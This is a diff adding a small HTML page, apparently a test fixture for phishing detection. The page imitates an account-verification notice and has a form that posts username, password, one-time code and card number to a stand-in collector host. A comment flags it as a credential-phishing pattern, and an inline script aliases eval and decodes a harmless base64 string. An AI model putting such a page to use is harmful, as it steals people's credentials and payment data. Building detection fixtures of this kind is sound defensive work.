@@ -1,0 +1,15 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Account Verification Required</title></head>
+<body>
+  <h1>Verify your account immediately</h1>
+  <p>Your account will be suspended. Please confirm your password and one-time code.</p>
+  <!-- Cross-domain form action + password + OTP: classic credential-phishing pattern -->
+  <form action="https://credential-collector.example/submit" method="post">
+    <input type="text" name="username" placeholder="Email" autocomplete="username" />
+    <input type="password" name="password" placeholder="Password" autocomplete="current-password" />
+    <input type="text" name="otp" placeholder="One-time code" />
+    <input type="text" name="cardNumber" placeholder="Card number" autocomplete="cc-number" />
+    <button type="submit">Verify</button>
+  </form>
+  <script>/* inline */ var x = eval; var y = atob("aGVsbG8=");</script>
+</body></html>
